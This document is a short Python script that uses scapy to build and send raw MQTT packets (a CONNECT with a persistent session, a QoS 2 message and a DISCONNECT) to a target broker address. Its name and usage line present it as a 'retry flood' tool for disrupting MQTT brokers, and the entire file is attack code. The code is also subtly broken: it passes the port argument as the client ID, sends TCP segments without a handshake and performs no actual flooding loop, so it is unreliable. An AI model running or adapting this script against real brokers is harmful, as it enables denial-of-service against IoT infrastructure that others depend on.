from scapy.all import send, IP, TCP
from scapy.contrib.mqtt import *
import sys


def flood(broker_ip, client_id='retry_flooder', broker_port=1883):
    ip_tcp_pkt = IP(dst=broker_ip)/TCP(dport=broker_port)


    # connect to broker
    try:
        send(ip_tcp_pkt/MQTTConnect(clientId=client_id, cleansess=0))
    except (PermissionError):
        print('Permission Error: are you root?\n\n')
        exit(0)

    send(ip_tcp_pkt/MQTT(QOS=2))


    # disconnect
    send(ip_tcp_pkt/MQTT(type=14))

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('usage: python3 retry_flood.py BROKER_IP [BROKER_PORT]')
        exit(0)

    elif len(sys.argv) == 3:
        flood(sys.argv[1], int(sys.argv[2]))

    elif len(sys.argv) == 2:
        flood(sys.argv[1])
